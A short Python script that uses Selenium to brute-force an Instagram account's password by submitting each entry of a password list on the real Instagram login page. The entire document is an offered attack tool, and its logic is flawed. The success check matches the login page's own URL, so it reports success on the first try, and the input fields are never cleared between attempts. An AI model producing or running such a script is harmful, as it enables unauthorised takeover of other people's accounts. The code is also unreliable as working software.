from selenium import webdriver
from selenium.webdriver.common.by import By

def brute_force_instagram(username, password_list):
    # Set up the Chrome webdriver
    driver = webdriver.Chrome()

    # Go to the Instagram login page
    driver.get('https://www.instagram.com/accounts/login/')

    # Enter the username and password, and attempt to log in
    for password in password_list:
        driver.find_element(By.NAME, 'username').send_keys(username)
        driver.find_element(By.NAME, 'password').send_keys(password)
        driver.find_element(By.XPATH, '//button[@type="submit"]').click()

        # Check if the login was successful
        if 'https://www.instagram.com/' not in driver.current_url:
            # If the login failed, print an error message
            print(f'Error: incorrect password = {password}')

            # Go back to the login page
            driver.get('https://www.instagram.com/accounts/login/')
        else:
            # If the login was successful, print a success message and return
            print(f'Success: password = {password}')
            return

# Example usage
brute_force_instagram('user', ['password1', 'password2', 'password3'])